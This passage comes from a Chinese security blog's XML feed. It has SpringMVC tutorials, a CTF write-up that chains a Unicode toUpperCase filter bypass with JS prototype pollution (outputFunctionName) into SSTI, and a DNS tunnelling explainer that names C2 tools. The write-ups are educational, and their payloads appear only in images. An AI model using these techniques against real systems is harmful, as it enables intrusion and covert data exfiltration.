xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line">       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;</span><br><span class="line">       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans</span><br><span class="line">       http://www.springframework.org/schema/beans/spring-beans.xsd</span><br><span class="line">       http://www.springframework.org/schema/context</span><br><span class="line">       https://www.springframework.org/schema/context/spring-context.xsd</span><br><span class="line">       http://www.springframework.org/schema/mvc</span><br><span class="line">       https://www.springframework.org/schema/mvc/spring-mvc.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 自动扫描包，让指定包下的注解生效,由IOC容器统一管理 --&gt;</span><br><span class="line">    &lt;context:component-scan base-package=&quot;com.orange.controller&quot;/&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 让Spring MVC不处理静态资源，如.css、.html、.mp4、.mp3等 --&gt;</span><br><span class="line">    &lt;mvc:default-servlet-handler /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!--</span><br><span class="line">    支持mvc注解驱动</span><br><span class="line">        在spring中一般采用@RequestMapping注解来完成映射关系</span><br><span class="line">        要想使@RequestMapping注解生效</span><br><span class="line">        必须向上下文中注册DefaultAnnotationHandlerMapping</span><br><span class="line">        和一个AnnotationMethodHandlerAdapter实例</span><br><span class="line">        这两个实例分别在类级别和方法级别处理。</span><br><span class="line">        而annotation-driven配置帮助我们自动完成上述两个实例的注入。</span><br><span class="line">     --&gt;</span><br><span class="line">    &lt;mvc:annotation-driven /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 视图解析器 --&gt;</span><br><span class="line">    &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span><br><span class="line">          id=&quot;internalResourceViewResolver&quot;&gt;</span><br><span class="line">        &lt;!-- 前缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot; /&gt;</span><br><span class="line">        &lt;!-- 后缀 --&gt;</span><br><span class="line">        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><h3 id="4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解"><a href="#4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解" class="headerlink" title="4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解"></a>4、新建一个Controller的包然后根据需求新建自己的Controller然后加上控制器注解以及路径映射注解</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/4.png" alt></p><h2 id="0x01-RestFul风格"><a href="#0x01-RestFul风格" class="headerlink" title="0x01 RestFul风格"></a>0x01 RestFul风格</h2><h3 id="1、不限定协议只限定如何从url路径中获取参数的方法"><a href="#1、不限定协议只限定如何从url路径中获取参数的方法" class="headerlink" title="1、不限定协议只限定如何从url路径中获取参数的方法"></a>1、不限定协议只限定如何从url路径中获取参数的方法</h3><blockquote><p>关键注解就是@PathVariable，用来指定这个参数通过url路径中的参数进行获取。然后@RequestMapping的路径将下面的参数通过{}进行包裹。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/5.png" alt></p><h3 id="2、不使用限定协议的注解的可以控制协议并获取参数的实现方法"><a href="#2、不使用限定协议的注解的可以控制协议并获取参数的实现方法" class="headerlink" title="2、不使用限定协议的注解的可以控制协议并获取参数的实现方法"></a>2、不使用限定协议的注解的可以控制协议并获取参数的实现方法</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/6.png" alt></p><h3 id="3、直接使用限定协议的路径映射注解就能直接限定请求的协议"><a href="#3、直接使用限定协议的路径映射注解就能直接限定请求的协议" class="headerlink" title="3、直接使用限定协议的路径映射注解就能直接限定请求的协议"></a>3、直接使用限定协议的路径映射注解就能直接限定请求的协议</h3><blockquote><p>使用注解@GetMapping、@PostMapping等。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/7.png" alt></p><h2 id="0x02-接收前端参数"><a href="#0x02-接收前端参数" class="headerlink" title="0x02 接收前端参数"></a>0x02 接收前端参数</h2><h3 id="1、提交的url参数名和处理方法的参数名一致"><a href="#1、提交的url参数名和处理方法的参数名一致" class="headerlink" title="1、提交的url参数名和处理方法的参数名一致"></a>1、提交的url参数名和处理方法的参数名一致</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/9.png" alt></p><h3 id="2、提交的url参数名和处理方法的参数名不一致"><a href="#2、提交的url参数名和处理方法的参数名不一致" class="headerlink" title="2、提交的url参数名和处理方法的参数名不一致"></a>2、提交的url参数名和处理方法的参数名不一致</h3><blockquote><p>即使前端和后端参数名一致也推荐加上这个注解@RequestParam，便于直接看出这个是和前端交互的参数。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/10.png" alt></p><h3 id="3、提交的是一个对象"><a href="#3、提交的是一个对象" class="headerlink" title="3、提交的是一个对象"></a>3、提交的是一个对象</h3><blockquote><p>前端提交的参数完全对应类中每个变量时，后端可以用类作为参数来接收前端的数据。</p></blockquote><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/11.png" alt></p><h2 id="0x04-Json格式"><a href="#0x04-Json格式" class="headerlink" title="0x04 Json格式"></a>0x04 Json格式</h2><h3 id="1、前端Js对象转Json字符串"><a href="#1、前端Js对象转Json字符串" class="headerlink" title="1、前端Js对象转Json字符串"></a>1、前端Js对象转Json字符串</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/12.png" alt></p><h3 id="2、前端Json字符串转Js对象"><a href="#2、前端Json字符串转Js对象" class="headerlink" title="2、前端Json字符串转Js对象"></a>2、前端Json字符串转Js对象</h3><p><img src="/2020/12/26/SpringMVC%E5%AE%9E%E8%B7%B5/13.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringMVC实践&quot;&gt;&lt;a href=&quot;#SpringMVC实践&quot; class=&quot;headerlink&quot; title=&quot;SpringMVC实践&quot;&gt;&lt;/a&gt;SpringMVC实践&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>SSTI+JS原型链污染</title>
    <link href="http://bai-ren-1.github.io/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <id>http://bai-ren-1.github.io/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</id>
    <published>2020-12-26T02:43:39.000Z</published>
    <updated>2020-12-26T02:46:58.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSTI-JS原型链污染"><a href="#SSTI-JS原型链污染" class="headerlink" title="SSTI+JS原型链污染"></a>SSTI+JS原型链污染</h1><p>打开环境是一个登录框，常规爆破、注入尝试无果。</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/6.png" alt></p><p>转变思路，尝试源码泄露获得源码：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png" alt></p><p>既然是 NodeJS的题目肯定首先想到的就是原型链污染了，开始审计代码寻找敏感处。跟进index.js文件：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2.png" alt></p><p>我们在上面的/action路由中看到了clone函数，跟进一下clone的实现：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3.png" alt></p><p>继续跟进，发现果然存在原型链污染的漏洞：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/4.png" alt></p><p>找到了漏洞存在的地方后，开始分析如何进行调用。在上面的/action路由的代码中，可以看到要调用clone进行链污染，需要处于ADMIN的登录状态。于是我们查看程序的其他代码，跟进/login路由中的注册功能的实现代码：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/5.png" alt></p><p>发现注册会将用户名转化为大写并写入session中，如果我们能控制用户名为ADMIN就可以进行链污染操作了。在此之前要先看如何绕过safeKeyword，跟进代码：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/7.png" alt></p><p>直接将admin给ban了，要对此进行绕过。查阅Nodejs漏洞<a href="https://xz.aliyun.com/t/7184#toc-11得知js使用toUpperCase中有几个特殊字符是可以用来绕过的：" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-11得知js使用toUpperCase中有几个特殊字符是可以用来绕过的：</a></p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/8.png" alt></p><p>用admın绕过admin的限制并成功登录为ADMIN，看到下面的页面：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/9.png" alt></p><p>点击提交后就会跳转到/action路由进行处理，即可以进行原型链污染的操作了。最后只需找到需要污染的参数即可，自然跟进最后一个路由/info：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/10.png" alt></p><p>看到render，自然可以污染outputFunctionName进行SSTI。构造污染请求包如下，修改为json格式：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/11.png" alt></p><p>访问/info触发漏洞下载获得flag：</p><p><img src="/2020/12/26/SSTI-JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/12.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SSTI-JS原型链污染&quot;&gt;&lt;a href=&quot;#SSTI-JS原型链污染&quot; class=&quot;headerlink&quot; title=&quot;SSTI+JS原型链污染&quot;&gt;&lt;/a&gt;SSTI+JS原型链污染&lt;/h1&gt;&lt;p&gt;打开环境是一个登录框，常规爆破、注入尝试无果。&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP禁用disable_functions绕过</title>
    <link href="http://bai-ren-1.github.io/2020/12/19/PHP%E7%A6%81%E7%94%A8disable-functions%E7%BB%95%E8%BF%87/"/>
    <id>http://bai-ren-1.github.io/2020/12/19/PHP%E7%A6%81%E7%94%A8disable-functions%E7%BB%95%E8%BF%87/</id>
    <published>2020-12-19T08:16:31.000Z</published>
    <updated>2020-12-19T08:28:21.339Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP禁用disable-functions绕过"><a href="#PHP禁用disable-functions绕过" class="headerlink" title="PHP禁用disable_functions绕过"></a>PHP禁用disable_functions绕过</h1><p>重要的内容  <a href="https://www.anquanke.com/post/id/197745#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745#h2-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP禁用disable-functions绕过&quot;&gt;&lt;a href=&quot;#PHP禁用disable-functions绕过&quot; class=&quot;headerlink&quot; title=&quot;PHP禁用disable_functions绕过&quot;&gt;&lt;/a&gt;PHP禁用disable_f
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>DNS隧道</title>
    <link href="http://bai-ren-1.github.io/2020/11/18/DNS%E9%9A%A7%E9%81%93/"/>
    <id>http://bai-ren-1.github.io/2020/11/18/DNS%E9%9A%A7%E9%81%93/</id>
    <published>2020-11-18T11:16:57.000Z</published>
    <updated>2020-11-18T12:30:08.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><p>记录DNS隧道的原理和检测。</p><h2 id="0x00-DNS解析"><a href="#0x00-DNS解析" class="headerlink" title="0x00 DNS解析"></a>0x00 DNS解析</h2><p>DNS的解析方式可以分未两种：迭代查询和递归查询。</p><h3 id="1-迭代查询"><a href="#1-迭代查询" class="headerlink" title="1. 迭代查询"></a>1. 迭代查询</h3><p>本地域名服务器向根域名服务器发送请求报文，根域名服务器要么给出ip地址要么告诉本地域名服务器下一步应该去查询另一个域名服务器(假设这个域名服务器为A)。本地域名服务器会向A域名服务器发送请求报文，A域名服务器要么给出ip地址要么告诉本地域名服务器下一步应该去查询B域名服务器。过程以此类推，直到查找到ip地址为止。 </p><h3 id="2-递归查询"><a href="#2-递归查询" class="headerlink" title="2. 递归查询"></a>2. 递归查询</h3><p>客户机向本地域名服务器查询，如果本地服务器的缓存中没有需要查询的ip地址，那么本地域名服务器会以客户机的身份（代替本机查询），向根域名服务器发送请求报文。递归查询返回的结果要么是查询到的ip地址，要么报错。</p><blockquote><p> 递归查询即客户端只发一次请求，要求对方给出最终结果。 </p></blockquote><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/1.png" alt></p><p>本机查询本地域名服务器，这部分属于递归查询。</p><p>本地域名服务器查询根域名服务器，这部分属于迭代查询。</p><h2 id="0x01-DNS隧道"><a href="#0x01-DNS隧道" class="headerlink" title="0x01 DNS隧道"></a>0x01 DNS隧道</h2><p>DNS隧道是隐蔽信道的一种，通过将其他协议封装在DNS协议中进行通信。封装由客户端完成，将DNS流量还原成正常的流量由服务器完成。 </p><h2 id="0x02-DNS隧道攻击"><a href="#0x02-DNS隧道攻击" class="headerlink" title="0x02 DNS隧道攻击"></a>0x02 DNS隧道攻击</h2><p>大多数防火墙和入侵检测设备对DNS流量是放行的。而隧道攻击正式利用了放行的特点以及协议解析流程来实现的。</p><h2 id="0x03-DNS隧道攻击类型"><a href="#0x03-DNS隧道攻击类型" class="headerlink" title="0x03 DNS隧道攻击类型"></a>0x03 DNS隧道攻击类型</h2><h3 id="1-IP直连型DNS隧道"><a href="#1-IP直连型DNS隧道" class="headerlink" title="1. IP直连型DNS隧道"></a>1. IP直连型DNS隧道</h3><p>直连也就是客户端直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。客户端使用UDP socket建立连接，实际上是基于UDP的，但是利用53端口。</p><h3 id="2-域名型DNS隧道（中继）"><a href="#2-域名型DNS隧道（中继）" class="headerlink" title="2. 域名型DNS隧道（中继）"></a>2. 域名型DNS隧道（中继）</h3><p>通过DNS迭代查询实现的中继隧道，比较隐蔽，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。 </p><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/2.png" alt></p><blockquote><p>此时PC是攻击者已经控制了，被植入了木马。并且aaa.com权威域名服务器也是在攻击者的控制之下，aaa.com域名也是攻击者的。</p></blockquote><p>手法：</p><p>Step 1：受控PC机将数据封装进DNS数据包里，像局域网内部的本地域名服务器请求查询aaa.com</p><p>Step 2：本地域名服务器透过防火墙向根域名服务器发送查询请求</p><p>Step 3：经过大量重定向，查询请求最终要aaa.com的权威域名服务器</p><p>Step 4：aaa.com权威域名服务器是在攻击者的控制下，解析发送过来的DNS数据包并发送回应包</p><p>Step 5：DNS回应包穿透防火墙</p><p>Step 6:：DNS回应包进入内网</p><p>Step 7：本地域名服务器将回应包返回给受控PC机</p><p>Step 8：受控PC机解析DNS回应包里的数据，得到新的指令</p><h2 id="0x04-DNS协议格式"><a href="#0x04-DNS协议格式" class="headerlink" title="0x04 DNS协议格式"></a>0x04 DNS协议格式</h2><p>重要部分说明：会话标识 – DNS报文的ID标识，区分DNS应答报文是哪个请求的响应</p><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/3.png" alt></p><p>重要的是要知道DNS有哪几种形式的报文：</p><p><img src="/2020/11/18/DNS%E9%9A%A7%E9%81%93/4.png" alt></p><h2 id="0x05-DNS隧道要点"><a href="#0x05-DNS隧道要点" class="headerlink" title="0x05 DNS隧道要点"></a>0x05 DNS隧道要点</h2><h3 id="1-DNS缓存机制的规避"><a href="#1-DNS缓存机制的规避" class="headerlink" title="1. DNS缓存机制的规避"></a>1. DNS缓存机制的规避</h3><p>再使用中继隧道时，如果需要解析的域名在本地的DNS Server中已经有缓存时，本地的DNS Server就不会转发数据包。所以在构造的请求中，每次查询的域名都是不一样的。</p><h3 id="2-DNS载荷的编码"><a href="#2-DNS载荷的编码" class="headerlink" title="2. DNS载荷的编码"></a>2. DNS载荷的编码</h3><p>从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为2roAUSwVqwOWCaaDC.test.nuoyan.com,其中2roAUSwVqwOWCaaDc则是客户端传递给服务器的信息，这串字符解码后的信息便是DNS隧道</p><h3 id="3-可利用DNS查询类型"><a href="#3-可利用DNS查询类型" class="headerlink" title="3. 可利用DNS查询类型"></a>3. 可利用DNS查询类型</h3><p>DNS的记录类型有很多，常见的有A，AAAA,CNAME,MX,NS等。DNS隧道可以利用其中的一些记录类型来传输数据。例如A，MX，CNAME,TXT等。</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A       记录 指定主机名（或域名）对应的IPV4地址记录</span><br><span class="line">AAAA    记录 指定主机名（或域名）对应的IPV6地址记录</span><br><span class="line">NS      记录  指定该域名由哪个DNS服务器来进行解析</span><br><span class="line">MX      记录  指向一个邮件服务器</span><br><span class="line">PTR     记录  将一个IP地址映射到对应的域名，也可以看成是A记录的反向</span><br><span class="line"><span class="built_in">CNAME</span>   记录  允许将多个名字映射到同一台计算机</span><br><span class="line">TXT     记录 一般指主机名或域名的说明</span><br></pre></td></tr></table></figure><h2 id="0x06-DNS隧道工具"><a href="#0x06-DNS隧道工具" class="headerlink" title="0x06 DNS隧道工具"></a>0x06 DNS隧道工具</h2><ul><li>dns2tcp：支持直连模式的DNS隧道，只实现了简单的DNS隧道，相关命令和控制服务需要自行搭建，且已在kali系统中直接集成。</li><li>iodine：最活跃、速度最快、支持直连和中继模式，且支持丰富的编码、请求类型选择</li><li>Dnscat2：封装在DNS协议中的加密C&amp;C信道，直接运行工具即可实现数据传输、文件操作等命令和控制功能。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DNS隧道&quot;&gt;&lt;a href=&quot;#DNS隧道&quot; class=&quot;headerlink&quot; title=&quot;DNS隧道&quot;&gt;&lt;/a&gt;DNS隧道&lt;/h1&gt;&lt;p&gt;记录DNS隧道的原理和检测。&lt;/p&gt;
&lt;h2 id=&quot;0x00-DNS解析&quot;&gt;&lt;a href=&quot;#0x00-DNS解
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringMVC注解</title>
    <link href="http://bai-ren-1.github.io/2020/09/23/SpringMVC%E6%B3%A8%E8%A7%A3/"/>
    <id>http://bai-ren-1.github.io/2020/09/23/SpringMVC%E6%B3%A8%E8%A7%A3/</id>
    <published>2020-09-23T09:26:18.000Z</published>
    <updated>2020-12-26T03:11:18.238Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringMVC注解"><a href="#SpringMVC注解" class="headerlink" title="SpringMVC注解"></a>SpringMVC注解</h1><h2 id="0x00-Controller"><a href="#0x00-Controller" class="headerlink" title="0x00 @Controller"></a>0x00 @Controller</h2><p>@Controller 用于标记在一个类上，使用它标记的类就是一个SpringMVC Controller 对象。分发处理器将会扫描使用了该注解的类的方法，并检测该方法是否使用了@RequestMapping 注解。@Controller 只是定义了一个控制器类，而使用@RequestMapping 注解的方法才是真正处理请求的处理器。</p><p>@Controller 标记在一个类上还不能真正意义上的说它就是SpringMVC 的一个控制器类，因为这个时候Spring 还不认识它。这个时候就需要我们把这个控制器类交给Spring 来管理。有两种方式可以管理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--方式一--&gt;</span><br><span class="line">&lt;bean class=&quot;com.cqvie.handler.HelloWorld&quot;/&gt;</span><br><span class="line">&lt;!--方式二--&gt;</span><br><span class="line">&lt; context:component-scan base-package = &quot;com.cqvie&quot; /&gt; &lt;!-- 路径写到controller的上一层 --&gt;</span><br></pre></td></tr></table></figure><p>此外Controller 不会直接依赖于HttpServletRequest 和HttpServletResponse 等HttpServlet 对象，它们可以通过Controller 的方法参数灵活的获取到。为了先对Controller 有一个初步的印象，以下先定义一个简单的        Controller ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">package com.cqvie.handler;</span><br><span class="line"></span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class HelloWorld &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/helloworld&quot;)</span><br><span class="line">    public String sayHello() &#123;</span><br><span class="line">        System.out.println(&quot;Hello World!&quot;);</span><br><span class="line">        return &quot;success&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-RequestMapping"><a href="#0x01-RequestMapping" class="headerlink" title="0x01 @RequestMapping"></a>0x01 @RequestMapping</h2><p>RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。</p><p>返回值会通过视图解析器解析为实际的物理视图，对于 InternalResourceViewResolver 视图解析器，会做如下的解析：<br>通过 prefix + returnVal + suffix 这样的方式得到实际的物理视图，然后做转发操作；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 配置视图解析器：如何把 handler 方法返回值解析为实际的物理视图 --&gt;</span><br><span class="line">     &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;</span><br><span class="line">         &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;&gt;&lt;/property&gt;</span><br><span class="line">         &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt;</span><br><span class="line">     &lt;/bean&gt;</span><br></pre></td></tr></table></figure><p>RequestMapping注解有六个属性:</p><p><strong>1、 value</strong></p><p>value：指定请求的实际地址；</p><p><strong>2、method；</strong></p><p>method： 指定请求的method类型， GET、POST、PUT、DELETE等，下面例子的@PathVariable后面讲解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Rest 风格的 URL（以 CRUD 为例）：</span><br><span class="line">     *         新增：/order POST</span><br><span class="line">     *         修改：/order/1 PUT</span><br><span class="line">     *         获取：/order/1 GET</span><br><span class="line">     *         删除：/order/1 DELETE</span><br><span class="line">     * @param id</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    @RequestMapping(value = &quot;/testRestPut/&#123;id&#125;&quot;, method = RequestMethod.PUT)</span><br><span class="line">    public String testRestPut(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestPut:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(value = &quot;/testRestDelete/&#123;id&#125;&quot;, method = RequestMethod.DELETE)</span><br><span class="line">    public String testRestDelete(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestDelete:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(value = &quot;/testRestPost/&#123;id&#125;&quot;, method = RequestMethod.POST)</span><br><span class="line">    public String testRestPost(@PathVariable int id) &#123;</span><br><span class="line">        System.out.println(&quot;testRestPost:&quot; + id);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(&quot;/testRestGet&quot;)</span><br><span class="line">    public String testRestGet() &#123;</span><br><span class="line">        System.out.println(&quot;testRestGet&quot;);</span><br><span class="line">        return SUCCESS;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>3、consumes</strong></p><p>consumes： 指定处理请求的提交内容类型（Content-Type），例如application/json, text/html;</p><p><strong>4、produces</strong></p><p>produces:  指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回；</p><p><strong>5、params</strong></p><p>params： 指定request中必须包含某些参数值是，才让该方法处理。</p><p><strong>6、headers</strong></p><p>headers： 指定request中必须包含某些指定的header值，才能让该方法处理请求。</p><p><strong>@RequestMapping(“/helloword/?/aa”) 的 Ant 路径,匹配符：</strong><br>?：匹配文件名的一个字符<br><em>：匹配文件名的所有字符<br>*</em>：匹配多层路径</p><p><strong>@RequestMapping(“/testPojo”) POJO类用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testPojo&quot;)</span><br><span class="line">public String testPojo(User user) &#123;</span><br><span class="line">    System.out.println(&quot;testPojo:&quot; + user);</span><br><span class="line">    return &quot;success&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@RequestMapping(“/testPojo”) Map用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testMap&quot;)</span><br><span class="line">public String testMap(Map&lt;String, Object&gt; map) &#123;</span><br><span class="line">    map.put(&quot;names&quot;, Arrays.asList(&quot;Tomcat&quot;, &quot;Eclipse&quot;, &quot;JavaEE&quot;));</span><br><span class="line">    return &quot;success&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@RequestMapping(“/testPojo”) ModelAndView用法：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　@RequestMapping(&quot;/testModelAndView&quot;)</span><br><span class="line">public ModelAndView testModelAndView() &#123;</span><br><span class="line">    String viewName = SUCCESS;</span><br><span class="line">    ModelAndView modelAndView = new ModelAndView(viewName);</span><br><span class="line">    modelAndView.addObject(&quot;time&quot;, new Date());</span><br><span class="line">    return modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Resource和-Autowired"><a href="#0x02-Resource和-Autowired" class="headerlink" title="0x02 @Resource和@Autowired"></a>0x02 @Resource和@Autowired</h2><p>@Resource和@Autowired都是做bean的注入时使用，其实@Resource并不是Spring的注解，它的包是javax.annotation.Resource，需要导入，但是Spring支持该注解的注入。</p><p><strong>1、共同点</strong></p><p>两者都可以写在字段和setter方法上。两者如果都写在字段上，那么就不需要再写setter方法。</p><p><strong>2、不同点</strong></p><p>（1）@Autowired</p><p>@Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired;只按照byType注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 